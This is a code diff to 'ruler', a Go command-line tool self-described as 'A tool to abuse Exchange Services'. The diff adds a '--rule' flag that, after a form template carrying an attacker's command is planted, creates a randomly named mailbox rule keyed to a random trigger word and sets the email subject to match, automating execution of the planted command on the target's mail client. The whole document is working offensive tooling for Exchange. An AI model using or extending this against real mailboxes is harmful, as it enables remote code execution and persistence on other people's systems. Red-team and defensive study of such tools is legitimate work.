@@ -508,6 +508,24 @@ func createForm(c *cli.Context) error {
 	if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
 		return err
 	}
+	utils.Info.Println("Form created successfully")
+
+	if c.Bool("rule") == true {
+		rname := utils.GenerateString(6)
+		utils.Info.Printf("Rule trigger set. Adding new rule with name %s\n", rname)
+		triggerword := utils.GenerateString(8)
+		utils.Info.Printf("Adding new rule with trigger of %s\n", triggerword)
+		if c.Bool("send") == false {
+			utils.Info.Printf("Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \"%s\" present in the subject. \n", triggerword)
+		}
+		//create delete rule
+		if _, err := mapi.ExecuteDeleteRuleAdd(rname, triggerword); err != nil {
+			utils.Error.Println("Failed to create the trigger rule")
+		} else {
+			utils.Info.Println("Trigger rule created.")
+		}
+		c.Set("subject", triggerword)
+	}
 
 	//trigger the email if the send option is enabled
 	if c.Bool("send") == true {
@@ -568,7 +586,7 @@ func main() {
 	app := cli.NewApp()
 	app.Name = "ruler"
 	app.Usage = "A tool to abuse Exchange Services"
-	app.Version = "2.1.0"
+	app.Version = "2.1.3"
 	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
 	app.Description = `         _
  _ __ _   _| | ___ _ __
@@ -918,6 +936,10 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 						cli.BoolFlag{
 							Name:  "send,s",
 							Usage: "Trigger the form once it's been created.",
+						},
+						cli.BoolFlag{
+							Name:  "rule,r",
+							Usage: "Trigger the form with a rule. This will add a new rule!",
 						},
 						cli.StringFlag{
 							Name:  "body,b",
